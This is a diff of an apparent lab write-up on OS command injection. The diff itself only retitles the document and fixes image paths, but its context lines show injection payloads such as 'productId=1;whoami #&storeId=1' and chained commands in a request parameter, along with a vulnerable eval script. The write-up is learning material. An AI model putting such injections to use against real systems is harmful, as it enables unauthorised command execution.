@@ -1,4 +1,4 @@
-# Lab: OS Command Injection (Simple Case)
+# Lab: OS Command Execution
 
 ## 🔹 Overview
 
@@ -68,7 +68,7 @@ Try 'whoami --help' for more information.
 /home/peter-iXsnkq/stockreport.sh: line 5: $2: unbound variable
 ```
 
-![Error](/images/error.png)
+![Error](images/error.png)
 
 This indicates that user input is being passed into a shell script.
 
@@ -84,7 +84,7 @@ productId=1;echo whoami&storeId=1
 
 Produced output that reflected my input
 
-![Reflected input](/images/reflecting-input.png)
+![Reflected input](images/reflecting-input.png)
 
 This produced reflected input rather than command execution, indicating that the payload needed refinement.
 
@@ -102,7 +102,7 @@ This initially caused a parameter error, which was resolved by using a comment t
 productId=1;whoami #&storeId=1
 ```
 
-![Injection](/images/injection.png)
+![Injection](images/injection.png)
 
 I also had success with:
 
@@ -136,7 +136,7 @@ set -eu
 eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
 ```
 
-![Source code](/images/source.png)
+![Source code](images/source.png)
 
 This revealed the critical vulnerability
 
@@ -152,7 +152,7 @@ I wanted to see how many commands I could try and chained a few common OS comman
 $(echo whoami);$(echo uname -a);$(echo ps -ef)
 ```
 
-![Curiousity](/images/curious.png)
+![Curiousity](images/curious.png)
 
 This demonstrates that multiple commands can be chained together once command injection is achieved.
 
